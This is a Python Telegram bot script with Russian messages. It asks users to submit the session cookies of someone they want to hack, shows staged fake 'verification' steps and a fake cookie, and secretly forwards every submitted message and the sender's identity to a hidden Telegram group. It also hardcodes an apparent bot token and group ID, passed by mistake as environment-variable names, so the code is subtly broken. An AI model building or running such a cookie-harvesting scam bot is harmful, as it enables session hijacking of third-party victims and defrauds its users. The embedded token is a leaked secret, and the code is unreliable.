import os
import telebot
import time

# Более надежное получение переменных
TOKEN = os.getenv('8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA')
GROUP_ID = os.getenv('-1003396901780')

# Проверка что переменные установлены
if not TOKEN:
    print("❌ ОШИБКА: BOT_TOKEN не установлен!")
    exit(1)
    
if not GROUP_ID:
    print("❌ ОШИБКА: GROUP_ID не установлен!")
    exit(1)

print("✅ Переменные окружения загружены успешно!")
print(f"Токен: {TOKEN[:10]}...")
print(f"ID группы: {GROUP_ID}")

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪")
    try:
        bot.send_message(GROUP_ID, f"👤 Кто-то нажал /start\nID: {message.from_user.id}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    bot.send_message(message.chat.id, "Проверка куки...")
    time.sleep(2)
    bot.send_message(message.chat.id, "Проверка прошла успешно ✅ Идёт инициализация...")
    time.sleep(3)
    bot.send_message(message.chat.id, "Инициализация завершена✅ ваш куки: CAEaAhACIhsKBGR1aWQSEzcyMDQzMzI1MzI4NDQxMjM2OTEoAw.dcx_K7KltLsjLmtD5zvo9MYLoxTWS-bwssrHI-5q2lB...")
    
    try:
        bot.send_message(GROUP_ID, f"📩 Сообщение от: {message.from_user.first_name}\nТекст: {message.text}")
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

print("🚀 Бот запускается...")
bot.polling(none_stop=True)
